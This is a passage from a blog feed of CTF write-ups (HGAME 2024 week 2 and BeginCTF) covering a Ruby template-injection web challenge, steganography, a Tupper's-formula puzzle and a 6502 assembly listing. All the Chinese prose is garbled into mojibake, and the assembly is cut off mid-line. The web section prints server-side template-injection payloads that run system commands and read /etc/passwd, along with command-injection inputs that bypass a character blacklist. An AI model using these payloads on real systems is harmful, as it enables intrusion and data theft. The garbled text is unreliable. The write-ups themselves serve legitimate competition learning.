ï¼Œå¯èƒ½ï¼Œæˆ‘ç°åœ¨æ­£åœ¨æŸä¸ªæœºæˆ¿çœ‹è®¾å¤‡å‘¢å§ã€‚</p><p>æˆ‘ä¸€å®šå¥½å¥½å¹²ï¼Œä¸è®©å“¥å¤±æœ›ã€‚</p><p>éœ€è¦æ„Ÿè°¢çš„äººå¤ªå¤šï¼Œå¯¹æˆ‘çš„å¥½æˆ‘éƒ½è®°å¾—ã€‚</p><p>â€œæˆ‘ä»ä¸ç›¸ä¿¡ä¸€å¸†é£é¡ºçš„è¯´æ³•ï¼Œä¸€å¸†é£é¡ºä»£è¡¨ç€ä½ æ²¡æœ‰é‡åˆ°ä»»ä½•å›°éš¾ï¼Œä¹Ÿå°±è¯´ä½ æ²¡æœ‰ç»å†è¿‡æ‰“å‡»ï¼Œä¹Ÿå°±æ²¡æœ‰ç§¯ç´¯ç›¸å¯¹åº”çš„ç»éªŒã€‚å­¦èµ°è·¯è¦ç»å†æ‘”è·¤ï¼Œå­¦éª‘è‡ªè¡Œè½¦è¦ç»å†æ‘”è·¤ï¼Œå­¦æ»‘é›ªè¦ç»å†æ‘”è·¤ï¼Œä½ éœ€è¦ä½“éªŒé‚£ç§æ‘”è·¤çš„ç—›æ„Ÿï¼Œä½ æ‰èƒ½å¤Ÿåœ¨æ‘”è·¤å‰åšå‡ºç›¸åº”çš„åŠ¨ä½œæ¥è®©è‡ªå·±å›å½’æ­£è½¨ã€‚â€</p><p>é€ç»™è‡ªå·±ï¼Œè°¦å‘ä¸€äº›ï¼ŒåŠªåŠ›ä¸€äº›ã€‚</p><p><img src="/images/my2023/image-20240207175359501.png" alt="image-20240207175359501"></p><blockquote><p>ç”Ÿæ—¥å¿«ä¹~<br>å¤šå¤šæ›´æ–°æ–‡ç« <br>ä¸€ç›´åœ¨è·¯ä¸Š<br>è¯»ä¹¦å¤ªå°‘ï¼Œæƒ³çš„å¤ªå¤š<br>date: 2024-02-08 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2024-WEEK-2-éƒ¨åˆ†wp</title>
      <link href="/2024/02/06/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/02/06/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h5 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h5><h6 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a><strong>What the cow say?</strong></h6><p>ç»è¿‡æµ‹è¯•æ˜¯rubyçš„sstiï¼Œé»˜è®¤çš„è¾“å…¥æœ‰ç»™äº†å°–æ‹¬å·äº†ï¼Œè€Œä¸”æˆ‘çœ‹ç½‘ä¸Šçš„payloadï¼Œéƒ½å¸¦=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= system(<span class="string">&quot;whoami&quot;</span>) %&gt; <span class="comment">#Execute code</span></span><br><span class="line">&lt;%= Dir.entries(<span class="string">&#x27;/&#x27;</span>) %&gt; <span class="comment">#List folder</span></span><br><span class="line">&lt;%= File.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read %&gt; <span class="comment">#Read file</span></span><br><span class="line"></span><br><span class="line">&lt;%= system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>) %&gt;</span><br><span class="line">&lt;%= `ls /` %&gt;</span><br><span class="line">&lt;%= IO.popen(<span class="string">&#x27;ls /&#x27;</span>).readlines()  %&gt;</span><br><span class="line">&lt;% require <span class="string">&#x27;open3&#x27;</span> %&gt;&lt;% @a,@b,@c,@d=Open3.popen3(<span class="string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= @b.readline()%&gt;</span><br><span class="line">&lt;% require <span class="string">&#x27;open4&#x27;</span> %&gt;&lt;% @a,@b,@c,@d=Open4.popen4(<span class="string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= @c.readline()%&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240206143139330.png" alt="image-20240206143139330"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user_input=% `id` %</span><br><span class="line">user_input=% `ca&#x27;&#x27;t app.py` %</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[&#x27;echo&#x27;,</span><br><span class="line">                              &#x27;cat&#x27;, &#x27;tee&#x27;, &#x27;;&#x27;, &#x27;&#x27;, &#x27;&amp;&#x27;, &#x27;&lt;&#x27;,</span><br><span class="line">                              &#x27;&gt;&#x27;, &#x27;\\&#x27;, &#x27;flag&#x27;] for black in</span><br></pre></td></tr></table></figure><p>å³å¯ï¼Œè¯»ä¸€ä¸‹æºç ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰çœ‹æ‡‚ã€‚å°±åªçœ‹æ‡‚äº†åŠäº†é‚£äº›å­—ç¬¦ï¼Œå¤ªèœäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_input=% `ca&#x27;&#x27;t /f*/f*` %</span><br></pre></td></tr></table></figure><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240206144223868.png" alt="image-20240206144223868"></p><h5 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h5><p>python3 bwmforpy3.py decode 100191209_p0.jpg image1.png s.png â€“alpha 10</p><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240207101520339.png" alt="image-20240207101520339"></p><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240207101507496.png" alt="image-20240207101507496"></p><p>T1hi3sI4sKey</p><p><a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a></p><p>ç±±ç±°ç±ªç±¶ç±®ç²„ç°¹ç±´ç±¨ç²‚ç±¸ç±¾ç±¨ç±¼ç°¹ç±µç±¿ç±®ç±¨ç±ªç±µç°ºç±¨ç±½ç±±ç°¼ç±¨ç±¼ç±®ç±¬ç±»ç°¼ç±½ç²†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTFéƒ¨åˆ†wp</title>
      <link href="/2024/01/31/BeginCTF%E9%83%A8%E5%88%86wp/BeginCTF%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/01/31/BeginCTF%E9%83%A8%E5%88%86wp/BeginCTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h5 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h5><h6 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h6><p>ä¸‹è½½åˆ°å‹ç¼©åŒ…åï¼Œè§£å‹å¯ä»¥çœ‹åˆ°æœ‰è®¸å¤štxtæ–‡ä»¶ï¼Œæ¯ä¸ªé‡Œé¢å¯èƒ½æ˜¯base64ï¼Œå†™ä¸ªè„šæœ¬æå–å‡ºæ¥(æ‰¾gpt)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šç›®å½•è·¯å¾„</span></span><br><span class="line">directory = <span class="string">&#x27;G:\\ctf\\tupper&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šè¾“å‡ºæ–‡ä»¶è·¯å¾„</span></span><br><span class="line">output_file = <span class="string">&#x27;D:\\vscodework\\ctf\\beginctf\\output.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åï¼Œå¹¶æŒ‰æ•°å­—æ’åº</span></span><br><span class="line">file_names = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(directory) <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.txt&#x27;</span>)]</span><br><span class="line">file_names.sort(key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[:-<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ–‡ä»¶ååˆ—è¡¨ï¼Œå¹¶å°†å†…å®¹å†™å…¥è¾“å‡ºæ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">        file_path = os.path.join(directory, file_name)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> txt_file:</span><br><span class="line">            f.write(txt_file.read())</span><br><span class="line"><span class="comment">#MTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ=</span></span><br></pre></td></tr></table></figure><p>è§£å¾—base64ä¸º<br>14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184</p><p>è¿™æ—¶å€™å†æ€ä¹ˆè§£ï¼Œå°±å€Ÿä¸å‡ºæ¥äº†ï¼Œç„¶åå¯ä»¥æœç´¢è¿™ä¸ªé¢˜ç›®åç§°Tupperï¼Œ<br><code>https://blog.csdn.net/weixin_44143678/article/details/119869423</code><br>æœåˆ°äº†è¿™ç¯‡æ–‡ç« ï¼Œå¾ˆæœ‰è¶£ï¼Œæ˜¯ä¸ªå·´æ‹‰å·´æ‹‰ä¸ç­‰å¼ï¼Œç„¶åå¾—å‡ºå›¾åƒ<br>åšä¸»ä¹Ÿç»™å‡ºäº†ç½‘ç«™<code>https://tuppers-formula.ovh/</code>,å°†keyå¡«å…¥å…¶ä¸­å³å¯<br><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240131150913661.png" alt="image-20240131150913661"></p><h6 id="where-is-crazyman-v1-0"><a href="#where-is-crazyman-v1-0" class="headerlink" title="where is crazyman v1.0"></a>where is crazyman v1.0</h6><p>ä¸‹è½½åˆ°å›¾ç‰‡åç›´æ¥googleä¸€ä¸‹å³å¯ï¼Œç§‹å¶åŸï¼Œæ²¡å»è¿‡</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240202085707374.png" alt="image-20240202085707374"></p><h5 id="re"><a href="#re" class="headerlink" title="re"></a>re</h5><h6 id="çº¢ç™½æœº"><a href="#çº¢ç™½æœº" class="headerlink" title="çº¢ç™½æœº"></a>çº¢ç™½æœº</h6><p>å‡‘å·§åšå‡ºæ¥çš„ï¼Œæ²¡ä»€ä¹ˆæŠ€æœ¯éš¾åº¦ï¼Œä¼šæœå°±è¡Œï¼Œ<br>æ‰“å¼€å‹ç¼©åŒ…ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br></pre></td><td class="code"><pre><span class="line">LDA #$01</span><br><span class="line">LDX #$00</span><br><span class="line">LDY #$FF</span><br><span class="line">d:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE d</span><br><span class="line">LDX #$00</span><br><span class="line">STA $2FF,X</span><br><span class="line">e:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE e</span><br><span class="line">LDX #$00</span><br><span class="line">STA $3FF,X</span><br><span class="line">f:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE f</span><br><span class="line">LDX #$00</span><br><span class="line">STA $4FF,X</span><br><span class="line">g:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $500,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE g</span><br><span class="line">LDX #$00</span><br><span class="line">STA $5FF,X</span><br><span class="line">LDX #$01</span><br><span class="line">LDA #$00</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$21</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$40</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">LDX #$61</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$81</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$04</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$24</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$44</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$64</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$84</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$46</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$66</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$86</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$4B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$6B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$8B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$AD</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$CB</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$10</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$30</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$50</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$70</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$6F</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$90</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$B0</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$D0</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">n:</span><br><span class="line">LDX #$34</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$53</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$73</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$93</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$B3</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$D4</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$37</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$57</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$77</span><br><span class="line">STA $200,X</span><br><span class="line">INX </span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$99</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$B9</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$D7</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$DC</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$BB</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$9B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$7B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$5B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$3C</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$00</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$22</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$42</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$41</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$61</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$60</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$80</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$A0</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA 